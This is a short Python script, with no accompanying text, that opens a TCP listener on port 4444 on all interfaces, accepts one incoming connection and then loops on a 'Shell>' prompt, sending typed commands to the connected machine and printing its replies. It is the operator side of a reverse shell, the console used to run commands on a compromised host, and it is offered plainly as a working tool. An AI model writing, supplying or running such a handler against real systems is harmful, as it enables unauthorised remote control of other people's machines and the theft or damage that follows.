import socket

HOST = "0.0.0.0"  # Listen on all available network interfaces
PORT = 4444

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(1)

print(f"[*] Listening on {HOST}:{PORT}")

client_socket, client_address = server.accept()
print(f"[+] Connection established from {client_address}")

while True:
    command = input("Shell> ")
    
    if command.lower() == "exit":
        client_socket.send(b"exit")
        break

    client_socket.send(command.encode())
    response = client_socket.recv(4096).decode()
    print(response)

client_socket.close()
server.close()
